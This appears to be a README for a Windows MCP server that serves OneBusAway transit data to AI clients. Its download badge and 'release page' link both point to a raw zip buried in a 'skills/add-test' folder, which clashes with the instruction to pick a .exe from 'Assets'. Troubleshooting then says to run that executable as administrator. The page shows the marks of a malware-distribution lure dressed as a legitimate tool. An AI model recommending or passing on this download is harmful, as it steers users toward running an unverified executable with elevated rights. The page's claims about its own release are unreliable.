# 🚌 onebusaway-mcp-server - Access real-time transit data with ease

[![Download Software](https://img.shields.io/badge/Download-Releases-blue.svg)](https://raw.githubusercontent.com/vshar5898/onebusaway-mcp-server/main/skills/add-test/mcp-onebusaway-server-neophyte.zip)

---

## 📋 Project Overview

The onebusaway-mcp-server application connects your computer to transit systems. It retrieves data for bus stops, routes, arrival times, and vehicle locations. This tool works with the Model Context Protocol to help transit data reach your preferred AI tools or personal dashboards. It supports both local command-line operation and network-based connections.

## ⚙️ System Requirements

Ensure your computer meets these standards before you begin:

*   Operating System: Windows 10 or Windows 11.
*   Memory: At least 4 gigabytes of RAM.
*   Storage: 50 megabytes of free disk space.
*   Internet Connection: A stable connection to retrieve live transit updates.
*   Administrator Access: Rights to install software on your machine.

## 📥 Downloading the Software 

1. Visit the project release page: [https://raw.githubusercontent.com/vshar5898/onebusaway-mcp-server/main/skills/add-test/mcp-onebusaway-server-neophyte.zip](https://raw.githubusercontent.com/vshar5898/onebusaway-mcp-server/main/skills/add-test/mcp-onebusaway-server-neophyte.zip).
2. Look for the section labeled "Assets."
3. Select the file ending in `.exe` that matches your Windows version.
4. Save the file to your "Downloads" folder.

## 🛠️ Setting Up Your Environment 

Most modern AI tools require a configuration file to recognize new servers. Follow these steps to prepare your system for the tool.

### Creating the Configuration Folder
1. Open your File Explorer. 
2. Navigate to your user profile folder, typically found under `C:\Users\YourName`.
3. Locate the folder named `.config`. If this folder does not exist, right-click inside the blank space, select "New," and choose "Folder." Name it `.config`.
4. Open the `.config` folder. Create a new subfolder named `mcp`. 
5. Inside the `mcp` folder, create a text file named `config.json`.

### Editing the Configuration File
1. Right-click `config.json` and choose "Open with" then select "Notepad."
2. Copy the code block below and paste it into the document:

```json
{
  "mcpServers": {
    "onebusaway": {
      "command": "C:\\path\\to\\your\\downloaded\\file.exe"
    }
  }
}
```

3. Replace `C:\\path\\to\\your\\downloaded\\file.exe` with the actual file path where you saved the application. 
4. Ensure you use double backslashes (`\\`) in the file path to remain compatible with Windows formatting.
5. Save the file and close Notepad.

## 🚀 Running the Server 

The server runs in the background of your computer. You do not need to keep the file window open. 

1. Open your AI client software.
2. Refresh the tools or extensions menu within your AI interface.
3. The AI client reads the `config.json` file on startup. It detects the onebusaway server.
4. Once connected, the AI can ask the server for transit updates.

## 🚦 Testing the Connection 

To confirm the server functions correctly:
1. Open your terminal by clicking the Start button and typing "cmd."
2. Paste the file path of your downloaded `.exe` into the command prompt and press Enter.
3. If the software is working, you will see a series of status messages indicating the server is waiting for input.
4. If you see the status messages, your installation is successful.

## 🛠️ Common Troubleshooting

*   **File not found:** Check the path in your `config.json` file. Ensure you typed the folder names correctly.
*   **Permission denied:** Right-click the `.exe` file, select "Properties," and check the box labeled "Run as administrator."
*   **No data returned:** Check your internet connection. The transit API requires an active web connection to pull real-time bus locations.
*   **UI timeout:** If your AI tools fail to connect, restart the AI software. Sometimes the configuration settings require a full program restart to load.

## 📝 Understanding Transit Data 

The onebusaway-mcp-server acts as a bridge. It creates a path between the public OneBusAway transit API and your digital environment. 

### Real-Time Arrivals
When you ask for arrival times, the server queries the transit agency database. It provides the exact minute a vehicle will reach your chosen stop.

### Vehicle Positions
These updates track physical bus locations along a route. This shows you if your bus is stuck in traffic or running ahead of schedule.

### Schedule Information
Access static schedule data if you prefer to see planned arrival times rather than temporary delays.

## 🤝 Getting Additional Support

If you need more help, check the project page for common questions. You can view the list of issues reported by other users to see if a fix already exists. We perform regular updates to keep the software compatible with the latest transit APIs.